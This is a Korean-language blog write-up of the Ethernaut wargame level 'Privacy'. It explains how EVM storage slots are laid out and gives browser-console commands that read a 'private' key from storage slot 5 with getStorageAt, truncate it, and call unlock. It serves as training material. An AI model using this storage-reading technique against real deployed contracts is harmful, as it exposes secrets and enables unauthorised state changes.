---
emoji: 🧢
title: (Ethernaut 취약점 12) Privacy
date: '2022-01-14 16:24:00'
author: 한성원
tags: ethernaut Privacy vulnerability
categories: 취약점분석
---


# 👋 Privacy
__Difficulty 8/10__

- 승리 조건
- 코드 분석
- 풀이
순서로 진행 될 것이다.

- - -

## 승리 조건
- contract를 unlock 하기!
- 즉 변수 locked를 false로 만들기
- - -

## 코드 분석
분석은 주석에!

```solidity
contract Privacy {
    
    bool public locked = true; // slot 0
    uint256 public ID = block.timestamp; // slot 1
    uint8 private flattening = 10; // slot 2
    uint8 private denomination = 255; // slot 2
    uint16 private awkwardness = uint16(now); // slot 2
    bytes32[3] private data; // slot 3,4,5

    //constructor: set data
    constructor(bytes32[3] memory _data) public {
        data = _data;
    }
    
    // key를 가지고 unlock 할 수 있는 function 
    function unlock(bytes16 _key) public {
        // _key와 bytes16(data[2])의 값이 같은지 확인한다.
        require(_key == bytes16(data[2]));
        // unlock 한다.
        locked = false;
    }

    /*
        A bunch of super advanced solidity algorithms...

        ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
        .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
        *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
        `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
        ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
    */
}

```
- - -


## 풀이
이 문제에서 우리의 목표는 Privacy contract를 locked 변수를 false로 만드는 것이다. 

[Ethernaut 8 Vault](https://holyhansss.github.io/ethernaut/8_vault_ethernaut/8_vault_ethernaut/)와 비슷하다고 생각한다.

이 문제를 풀기전에 우리가 알아야 하는 것들이 있다.
- Storage
- casting
에 대해서 확실하게 알아야 한다.
Vault에서도 설명했지만 한번 더 storage에 대해서 설명하겠다. 
EVM의 Storage는 2^256개의 메모리 슬롯을 가지고 있다. 그리고 각 slot은 32 bytes( = 256 bits)의 크기이다. 하나의 slot에 여러가지 변수를 저정할 수 있다. 하지만 변수 선언 순서에 따라 slot 할당이 달라지니 유의하자! 아래의 예시처럼 uint8, uint256, uint8은 3개를 차지하지만 uint8, uint8, uint256은 슬롯 2개 밖에 차지하지 않는다.  Gas optimization을 위해서는 우리가 꼭 알고 있어야할 내용이다!
```solidity
uint8 a // slot 0
uint256 b // slot 1
uint8 c // slot 2
```
```solidity
uint8 a // slot 0
uint8 b // slot 0
uint256 c // slot 1
```
[이 글](https://medium.com/coinmonks/solidity-variables-storage-type-conversions-and-accessing-private-variables-c59b4484c183)에 설명이 잘 되어있으니 한번 확인해 보자! 이 글에서는 casting에 대해서도 다루고 있으니 꼭 보고 오는 것을 추천한다.

우리는 이 문제를 풀기 위해 web3.eth.getStorageAt() method를 사용한다. web3.eth.getStorageAt를 통해 우리는 lowlevel에서 storage data를 불러올 수 있다.

우선 console 창에서 실행시킨다
ctrl + shift + i를 눌러 console창을 활성화 시키자
```javascript
// locked가 true로 lock된 것을 알 수 있다.
await contract.locked()

// 코드 분석에서 봤듯이 data[2]는 5 번째 slot에 저장되어있다.
await web3.eth.getStorageAt(instance, 5) // 0x3aa30e05517b3f1490c335bb41be74713b0568225baaad3b56642e103a3b4335

// 우리는 16bytes 만 필요하기 때문에 반을 뚝 잘라 앞부분만 사용한다.
await contract.unlock("0x3aa30e05517b3f1490c335bb41be7471")

// locked가 false로 바뀐 것을 확인 할 수 있다.
await contract.locked()
```
이후 Submit instance를 누르고 조금 기다리면 block이 mine되고, 아래와 같이 뜨며 마무리된다.
```
٩(- ̮̮̃-̃)۶ Well done, You have completed this level!!!
```

- - -

## 마무리
블록체인상의 정보는 모두에게 공개된다. 모든 사람이 storage를 쉽게 확인 할 수 있기 때문이다. 민감한 정보들은 블록체인에 올리지 않는 것이 좋다. 또한 변수 선언 순서에 따라 때로는 더 많은 비용를 지불해야 할 수도 있기 때문에 코드를 적을때 항상 최적화에 대해 생각하며 하자!! 


- - -
## 기타 정보
- rinkeyb network ether faucet: https://faucets.chain.link/rinkeby
- ethernaut: https://ethernaut.openzeppelin.com/
- remix IDE: https://remix.ethereum.org
- Ethernaut 8 Vault: https://holyhansss.github.io/ethernaut/8_vault_ethernaut/8_vault_ethernaut/
- Storage & Casting: https://medium.com/coinmonks/solidity-variables-storage-type-conversions-and-accessing-private-variables-c59b4484c183
- Privacy 취약점: https://holyhansss.github.io/vulnerability/private_variable/private_variable/
```toc

```